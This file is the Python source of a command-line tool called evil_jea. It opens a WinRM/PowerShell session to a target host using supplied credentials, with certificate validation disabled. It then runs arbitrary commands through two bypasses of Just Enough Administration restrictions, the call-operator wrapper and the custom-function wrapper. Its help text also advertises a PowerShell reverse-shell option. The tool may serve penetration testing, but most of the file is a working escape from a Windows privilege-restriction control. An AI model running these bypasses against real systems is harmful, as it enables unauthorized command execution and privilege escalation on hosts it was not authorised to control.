#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This is the entry point for the command-line interface (CLI) application.

It can be used as a handy facility for running the task from a command line.

.. note::

    To learn more about Click visit the
    `project website <http://click.pocoo.org/5/>`_.  There is also a very
    helpful `tutorial video <https://www.youtube.com/watch?v=kNke39OZ2k0>`_.

    To learn more about running Luigi, visit the Luigi project's
    `Read-The-Docs <http://luigi.readthedocs.io/en/stable/>`_ page.

.. currentmodule:: evil_jea.cli
.. moduleauthor:: Sasha Thomas <sthomas@securityinnovation.com>
"""
import logging
import click
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from .__init__ import __version__

LOGGING_LEVELS = {
    0: logging.NOTSET,
    1: logging.ERROR,
    2: logging.WARN,
    3: logging.INFO,
    4: logging.DEBUG,
}  #: a mapping of `verbose` option counts to logging levels


class Info(object):
    """An information object to pass data between CLI functions."""

    def __init__(self):  # Note: This object must have an empty constructor.
        """Create a new instance."""
        self.verbose: int = 0


# pass_info is a decorator for functions that pass 'Info' objects.
#: pylint: disable=invalid-name
pass_info = click.make_pass_decorator(Info, ensure=True)


# Change the options to below to suit the actual options for your task (or
# tasks).
@click.group()
@click.option("--verbose", "-v", count=True, help="Enable verbose output.")
@pass_info
def cli(info: Info, verbose: int, max_content_width=120):
    '''\b
___________     .__.__                 ____.___________   _____   
\_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
 |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
 |        \\\   /|  |  |__ /_____/ /\__|    | |        \/    |    \\
/_______  / \_/ |__|____/         \________|/_______  /\____|__  /
        \/                                          \/         \/ 
                                                                                                                         
    '''
    # Use the verbosity count to determine the logging level...
    if verbose > 0:
        logging.basicConfig(
            level=LOGGING_LEVELS[verbose]
            if verbose in LOGGING_LEVELS
            else logging.DEBUG
        )
        click.echo(
            click.style(
                f"Verbose logging is enabled. "
                f"(LEVEL={logging.getLogger().getEffectiveLevel()})",
                fg="yellow",
            )
        )
    info.verbose = verbose

help_text = """
JEA Shell Commands:
    help                    Show list of available commands
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run PowerShell reverse shell inside of custom function
"""

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
def connect(username, password, target):
    """
    Connect to JEA target.
    
    \b
    JEA Shell Commands:
        help        Show list of available commands
        call        JEA bypass: Create new function: xyz
        rev_shell   JEA bypass: Create new powershell reverse shell xyz

    """
    commands = ["help", "call", "run", "function"]

    wsman = WSMan(target, username=username,
              password=password, ssl=False,
              auth="negotiate",cert_validation=False)
    print("[+] Testing connection...")
    test = run_command(wsman, "Get-Command")
    if (test):
        print("[+] Connection succeeded. Available commands:")
        for result in test:
            print(result)
    else:
        print("[-] Something went wrong. Check your credentials or target")

    while True:
        command = input(f"[{target}]: PS> ")
        root_command = command.split()[0]
        if root_command in commands:
            match root_command:
                case "help":
                    print(help_text)
                case "call":
                    new = command.split()[1]
                    for result in call_bypass(wsman, new):
                        print(result)
                case "function":
                    new = command.split()[1]
                    for result in function_bypass(wsman, new):
                        print(result)
                case _:
                    print("JEA shell command not found!")
        
        else:
            result = run_command(wsman, command)
            for output in result:
                print(output)



@cli.command()
def version():
    """Get the library version."""
    click.echo(click.style(f"{__version__}", bold=True))

def run_command(wsman, command):
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        ps.invoke()
        return ps.output

def call_bypass(wsman, command):
    result = run_command(wsman, "&{ " + command + " }")
    return result

def function_bypass(wsman, command):
    result = run_command(wsman, "function gl {" + command + "}; gl")
    return result
